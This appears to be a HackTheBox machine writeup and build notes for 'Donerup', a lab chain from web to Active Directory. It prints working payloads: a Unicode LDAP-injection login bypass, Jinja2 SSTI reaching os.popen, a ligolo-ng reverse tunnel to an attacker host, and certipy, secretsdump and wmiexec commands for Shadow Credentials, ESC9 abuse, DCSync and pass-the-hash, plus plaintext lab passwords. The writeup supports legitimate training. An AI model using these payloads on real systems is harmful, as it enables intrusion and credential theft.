# Donerup — Writeup

> **HTB writeup compliance note:** This document should only be distributed
> once the box is retired / the box owner has approved sharing. Flag values
> are **redacted** — real HTB Machine flags are a raw 32-character
> hexadecimal (MD5-format) string, *not* `HTB{...}`-wrapped (that wrapping
> is a Challenge convention, not a Machine one) — the reader is expected to
> obtain the flag themselves. This writeup
> documents the step-by-step methodology for someone who has already solved
> the box; it does not provide a shortcut or ready-made "cheat" script —
> every step explains *why* it works.

## Introduction

Donerup targets the gap between a web-tier compromise and a domain
compromise: two intentionally-realistic web bugs (an encoding/normalization
ordering flaw in an LDAP filter, and a literal-substring-blacklist SSTI in
Jinja2) hand a player RCE inside an unprivileged container, but that
foothold sits on an isolated network segment with no direct route to the
Active Directory VLAN. Reaching the DC requires actually pivoting, not just
"already being on the right subnet." Once inside the AD VLAN, the intended
path chains a real, still-seen-in-the-wild ADCS misconfiguration (ESC9,
`NoSecurityExtension` on a UPN-bound template) through a `GenericWrite`
edge via Shadow Credentials, ending in a certificate-based PKINIT and a
DCSync. Skills exercised: LDAP injection root-causing, Jinja2 sandboxing
weaknesses, ADCS template auditing (ESC9, and redundantly ESC10), AD ACL
abuse, and network pivoting through an enforced default-deny boundary.

## Info for HTB

### Access

Passwords:

| User | Password | Notes |
| --- | --- | --- |
| `jdoe` | `SogukDonerAyran7` | Regular migrated employee; carries the legacy plaintext-equivalent credential in `info` (see the LDAP-injection section) but has no admin-panel access — a red herring, not a shortcut. |
| `svc_ldap` | `KebapciBind2026!Sec` | The LDAP bind service account; also the "real path" credential the CHANGELOG.md hint leads a player to. Set in `build/dc-provisioning/02-create-users.ps1`. |
| `svc_backup` | Random GUID, re-rolled on every provisioning run | Never meant to be known in plaintext — it's the GenericWrite victim, compromised via Shadow Credentials (`certipy shadow auto`), not by password. |
| `Administrator` (domain) | *(fill in from the DC's Windows install — not stored in any script)* | Not needed to solve the box (compromised via the ESC9 → PKINIT → DCSync chain); provided here only so HTB staff can log in directly to verify. |
| DSRM / local recovery | `R00tP@ssw0rd2026!` | Set during `dcpromo` in `build/dc-provisioning/01-promote-dc.ps1`. |

### Key Processes

- **`proxy`** (`build/proxy/`, nginx): TLS termination on 80/443, the only
  published entry point — reverse-proxies to `web:5000` internally so a
  player's first nmap sees the corporate portal, not a bare dev port.
- **`web`** (`build/web/`, gunicorn + Flask on `python:3.12-slim`):
  implements the corporate LDAP-themed SSO portal. Two deliberately
  vulnerable surfaces: (1) the login form's LDAP filter is
  sanitize-then-normalize instead of normalize-then-sanitize, letting
  fullwidth Unicode parentheses smuggle real `(`/`)` past the blacklist;
  (2) `/admin/report-template` feeds user input into a Jinja2
  `Environment().from_string()` guarded only by a literal-substring
  blacklist, defeated by string concatenation (`~`).
- **`legacy-auth-db`** (`build/legacy-auth-db/`, MySQL): the intentional
  rabbit hole — stale pre-migration test data, explicitly disclaimed as
  not-current-credentials in `build/web/CHANGELOG.md`.
- **AD CS on `DC01`**: `Donerup-CA` issues the `DonerupUserAuth`
  certificate template, deliberately configured for ESC9
  (`NoSecurityExtension` + `SubjectAltRequireUpn`) and, redundantly, ESC10
  (works out of the box against this DC's default Schannel config — no
  extra registry change was needed).

### Automation / Crons

- **`build/web/docker-entrypoint.sh`** (runs as root at container start):
  mints `user.txt` once, idempotently; mints a fresh `FLASK_SECRET_KEY`
  every start (a pinned constant would let the SSTI RCE's `env` access
  forge an admin session, bypassing the LDAP injection entirely — see the
  rationale comment in `docker-compose.yml`); and installs the AD-VLAN
  kernel route by resolving the `internal-ad` interface from the routing
  table rather than assuming an interface name.
- **`build/dc-provisioning/06-place-root-flag.ps1`**: idempotent — a
  re-run doesn't rotate a flag a player may already hold, but always
  re-applies the ACL lockdown, so it also works as a repair step.
- **`donerup-ad-pivot.service`** (`build/network/`, systemd unit wrapping
  `setup-ad-pivot.sh`): re-applies the firewall chain below on every host
  boot, so the isolation control isn't lost to a reboot.

### Firewall Rules

`build/network/setup-ad-pivot.sh` installs a `DONERUP_AD_PIVOT` chain
hooked into Docker's `DOCKER-USER` chain (not `FORWARD` directly — Docker's
own reconciliation never rewrites `DOCKER-USER`, so rules there survive a
daemon restart):

1. Explicit `DROP`: the HTB VPN client subnet → the AD VLAN (no direct
   route in).
2. `ACCEPT`: the `internal-ad` bridge (i.e. only the `web` container) → the
   AD VLAN, plus the `ESTABLISHED,RELATED` return path.
3. Default `DROP`: anything else addressed to the AD VLAN.
4. `MASQUERADE`: `internal-ad` → AD VLAN traffic, NAT'd behind the host's
   AD-VLAN IP so the DC never needs a route back into Docker's internal
   `172.28.0.0/24` range.

### Docker

Three services, defined in `build/docker-compose.yml`:

- `build/proxy/Dockerfile` — nginx TLS termination.
- `build/web/Dockerfile` — the Flask/gunicorn app (`python:3.12-slim`).
- `build/legacy-auth-db/Dockerfile` — the MySQL rabbit hole.

Two networks: `dmz` (all three services) and `internal-ad` (Docker
`internal: true`, only `web` and the AD VLAN gateway) — `web` is the sole
bridge between the two.

### Other

- `FLASK_SECRET_KEY` is intentionally *not* pinned in `docker-compose.yml`
  (see the comment there) — a constant value would be one `env` call away
  from a forged session via the SSTI RCE, shortcutting past the LDAP
  injection the box is built around.
- ESC10 is a confirmed-working, fully redundant path to the same
  `Administrator` cert (same UPN-swap technique, over LDAPS/Schannel
  instead of Kerberos/PKINIT) — noted here so a future patch doesn't
  silently close it without realizing it's a live alternate solve, not
  dead code.
- `legacy-auth-db` is an intentional rabbit hole with no real credentials;
  acceptable at Insane difficulty, where HTB's own rating guidance permits
  educational rabbit holes.
- **Not yet exercised end-to-end in the build lab** (both need a real
  VPN-side host, not the lab's direct AD-VLAN route): firewall rule 1
  above (the VPN-subnet `DROP`), and the ligolo-ng tunnel itself.

---

# Writeup

## Machine Info

| | |
|---|---|
| **Name** | Donerup |
| **OS** | Linux (foothold) → Windows Server 2022 (Domain Controller) |
| **Difficulty** | Insane |
| **Category** | Active Directory / Web |
| **Domain** | `donerup.htb` |
| **DC** | `DC01.donerup.htb` |
| **Attacker subnet** | `10.10.14.0/23` (VPN client) |
| **Target VLAN** | `10.10.20.0/24` (AD VLAN, reachable only via pivot) |

---

## TL;DR

1. Bypass authentication on the web app via **LDAP injection**, logging in
   as `administrator` (an app-level role, not domain admin).
2. Get **SSTI → RCE** through the report-template feature in the admin
   panel.
3. Find `user.txt` inside the container; a `CHANGELOG.md` hint reveals that
   the real AD service account's (`svc_ldap`) password lives in an
   environment variable.
4. Drop a **ligolo-ng** agent via the RCE foothold and tunnel into the AD
   VLAN (`10.10.20.0/24`).
5. Enumerate AD with the `svc_ldap` credential and find an **ESC9**
   vulnerable certificate template (no security extension).
6. Use `svc_ldap`'s **GenericWrite** over `svc_backup` to compromise it via
   shadow credentials.
7. Change `svc_backup`'s `userPrincipalName` to `administrator`, enroll a
   certificate against the ESC9 template, then restore the UPN to cover
   tracks.
8. Authenticate with the spoofed-UPN certificate via PKINIT → recover the
   **Domain Administrator NT hash**.
9. **DCSync** to dump every domain secret, including `krbtgt` → Domain
   Admin.
10. Read `root.txt` on the DC using the recovered administrator hash.

---

## 1. Recon

### Nmap

```
$ nmap -sC -sV -p- <TARGET_IP>
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx (redirects to 443)
443/tcp open  https    nginx — self-signed TLS, fronts a Flask app
```

Port 80 redirects to 443 (TLS enforced). Behind 443 sits a Flask
application with an LDAP-themed login page — the page copy itself hints
("corporate directory login") that real authentication is backed by LDAP.

There are also traces in-app of a second service (`legacy-auth-db`, a
MySQL-backed legacy auth) — this is a **deliberate rabbit hole**: its
account names don't match real AD accounts and it exists purely to burn
time.

---

## 2. Foothold — LDAP Injection

The login form embeds the username directly into an LDAP filter:

```
(&(sAMAccountName={username})(info={password}))
```

The application **blacklists** classic LDAP-injection characters (`(`,
`)`, `*`, `\`). But the filtering order is wrong: ASCII characters are
stripped from the blacklist **first**, and only *afterward* are fullwidth
Unicode look-alike parentheses (`（` U+FF08, `）` U+FF09) normalized back
to their ASCII equivalents. An attacker can smuggle fullwidth parentheses
straight through the blacklist and let the normalization step turn them
into real `(`/`)` — a classic "sanitize before normalize" ordering bug.

**Payload** (username field, using fullwidth parentheses):

```
administrator）（|（sAMAccountName=administrator
```

(the password field just needs a single `）`)

After sanitize + normalize, the filter becomes:

```
(&(sAMAccountName=administrator)(|(sAMAccountName=administrator)(info=))
```

The injected `(|(...)` turns the query into an OR, neutralizing the
password check — the server authenticates `administrator` without ever
validating the password. The app echoes back the directory's resolved
`sAMAccountName` (`Administrator`) rather than the submitted payload on
the dashboard, so no injection trace shows up in the response — but the
session is now `administrator` (app-level role).

> Note: this "administrator" is the web app's own role system, not a
> domain admin — it just grants access to the admin panel.

---

## 3. RCE — SSTI (Jinja2)

The `/admin/report-template` endpoint feeds user input straight into a
Jinja2 `Environment().from_string()` call — classic **Server-Side
Template Injection**.

A naive payload (`{{ ''.__class__ }}`) is blocked: the app scans the
content **inside** `{{ ... }}` / `{% ... %}` blocks for tokens like `__`,
`class`, `mro`, `subclasses`, `import`, `os.`, `popen`, `system`, `eval`,
`exec`, and even a literal space character.

The blacklist only checks for **literal substrings**, so splitting those
tokens with Jinja2's string-concatenation operator (`~`) defeats it
entirely:

```
{{''['_'~'_cla'~'ss_'~'_']}}
```

This bypasses the blacklist and renders `<class 'str'>` — a harmless PoC
confirming RCE is possible.

For real command execution, `lipsum`'s globals give access to `os.popen`
(again split with `~`, and needing no spaces):

```
{{lipsum['_'~'_glo'~'bals'~'_'~'_']['o'~'s']['pop'~'en']('id').read()}}
```

This executes commands inside the container as `appuser`. Since `appuser`
can write and execute in its own home directory, a ligolo-ng agent can be
dropped from here (see §5).

**`user.txt`** sits in `appuser`'s home directory:

```
c██████████████████████████████e
```

---

## 4. Credential discovery — the CHANGELOG.md hint

`/home/appuser/CHANGELOG.md` inside the container explicitly states that
the old MySQL-backed auth (the §1 rabbit hole) is deprecated, that real
authentication is handled entirely via LDAP bind, and that the bind
credentials live in the container's **environment variables**
(`LDAP_BIND_DN` / `LDAP_BIND_PASSWORD` / `LDAP_SERVER_HOST`).

Running `env` via the RCE foothold reveals `LDAP_BIND_PASSWORD` in plain
text — this is the password for a real AD service account, `svc_ldap`.

---

## 5. Pivot — tunneling into the AD VLAN with ligolo-ng

The container only sits on the `dmz` network and has no direct route to
the AD VLAN (`10.10.20.0/24`) — an iptables chain on the host
(`DONERUP_AD_PIVOT`) only allows traffic sourced from the `internal-ad`
bridge and default-denies anything from `dmz`. Getting past this requires
a tunnel established via the RCE foothold:

```
# In the container (via RCE), drop and run a ligolo-ng agent binary
./agent -connect <attacker-ip>:11601 -ignore-cert

# On the attacker box
ligolo-proxy -selfcert
session
ifconfig
route add 10.10.20.0/24 <tun-iface>
```

Once the tunnel is up, `10.10.20.10` (the DC) becomes directly reachable.

---

## 6. AD Enumeration — ESC9

Enumerating CAs/templates with certipy using the `svc_ldap` credential:

```
certipy find -u svc_ldap@donerup.htb -p '<svc_ldap-password>' -dc-ip 10.10.20.10 -vulnerable
```

The `DonerupUserAuth` template is flagged **ESC9**:

- `Enrollment Flag: NoSecurityExtension` — the certificate isn't stamped
  with the `szOID_NTDS_CA_SECURITY_EXT` security extension, so certificate
  authentication maps **purely by UPN/SAN**, not by the certificate
  owner's actual `objectSid`.
- `Authenticated Users` can enroll against the template.
- The template's `Certificate Name Flag` (`SubjectAltRequireUpn`) embeds
  the requester's **current UPN** as the certificate's SAN.

This opens the door to the classic ESC9 attack: "change your UPN to
`administrator` → enroll against the template → the resulting
certificate authenticates as `administrator`."

---

## 7. GenericWrite → Shadow Credentials → ESC9 chain

BloodHound/certipy enumeration shows `svc_ldap` holds **GenericWrite**
over the `svc_backup` object. That right is enough to write to the
`msDS-KeyCredentialLink` attribute (a "shadow credentials" attack):

```bash
# 1) Add a shadow credential to svc_backup and pull its NT hash
certipy shadow auto -u svc_ldap@donerup.htb -p '<svc_ldap-pw>' \
    -account svc_backup -dc-ip 10.10.20.10

# 2) Change svc_backup's UPN to administrator
certipy account update -u svc_ldap@donerup.htb -p '<svc_ldap-pw>' \
    -user svc_backup -upn administrator -dc-ip 10.10.20.10

# 3) As svc_backup, enroll against the ESC9-vulnerable template
certipy req -u svc_backup@donerup.htb -hashes <svc_backup-nthash> \
    -ca Donerup-CA -template DonerupUserAuth -dc-ip 10.10.20.10

# 4) Restore svc_backup's UPN to cover tracks (a real attacker would do
#    this too, to avoid detection)
certipy account update -u svc_ldap@donerup.htb -p '<svc_ldap-pw>' \
    -user svc_backup -upn svc_backup -dc-ip 10.10.20.10

# 5) PKINIT with the certificate carrying UPN=administrator
certipy auth -pfx svc_backup.pfx -dc-ip 10.10.20.10
```

Because of `NoSecurityExtension`, the KDC reads the certificate's SAN
UPN (`administrator`) and maps it to the **real** `Administrator`
account — even though the certificate still belongs to `svc_backup`
(a different `objectSid`), strong certificate mapping is disabled for
this template, so the mapping falls through to UPN. Result: a valid TGT
and NT hash for `Administrator@donerup.htb`.

---

## 8. DCSync → Domain Admin

With the recovered `Administrator` NT hash, DCSync directly:

```bash
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:<admin-nthash> \
    donerup.htb/administrator@10.10.20.10 -just-dc
```

Every domain hash, including `krbtgt`, is dumped — **Domain Admin**
achieved.

---

## 9. `root.txt`

Pass-the-hash to the DC with the recovered `Administrator` NT hash:

```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<admin-nthash> \
    administrator@10.10.20.10
```

`root.txt` sits behind an ACL restricted to `Administrators:(R)` /
`SYSTEM:(F)`:

```
r██████████████████████████████t
```

---

## Root Cause Analysis

| Step | Root cause |
|---|---|
| LDAP injection | The character blacklist runs **before** Unicode normalization — sanitize-then-normalize instead of normalize-then-sanitize. |
| SSTI | User input is fed straight into `Environment().from_string()`; the only defense is a literal-substring blacklist, trivially defeated with string concatenation (`~`). The correct fix is a sandboxed Jinja2 environment (`ImmutableSandboxedEnvironment`) or removing the template engine entirely. |
| Credential leak | The service account password sits in a container environment variable in plaintext — anyone with RCE can read it via `env`. |
| ESC9 | The combination of `NoSecurityExtension`, a UPN-based SAN, and a writable UPN (via `GenericWrite`) reduces certificate authentication to a UPN match instead of true ownership. |
| DCSync | Once the Domain Admin hash is obtained, this is an inevitable consequence of AD's design — the real break happens at the ESC9 step. |

---

## Beyond Root (not exercised / partial coverage)

- **Network isolation control**: not testable in this environment since
  the attacker already sits on the AD VLAN itself — needs to be tried from
  a real HTB VPN client (`10.10.14.0/23`).
- **Ligolo tunnel**: the steps in §5 are documented, but were not run
  end-to-end automatically while preparing this writeup; DC access was
  verified over the lab environment's own direct route.

---

## Run Timeline (this pass)

| Phase | Result |
|---|---|
| Recon / web foothold | PASS |
| Rabbit hole (legacy-auth-db) elimination | PASS |
| CHANGELOG hint → `svc_ldap` password | PASS |
| Pivot tunnel | Manual / documented |
| ESC9 detection | PASS |
| ESC9 → DCSync chain | PASS |
| `user.txt` | PASS |
| `root.txt` | PASS |

Raw command output: `build/exploit/logs/full-chain-replay-2026-08-28.log`.
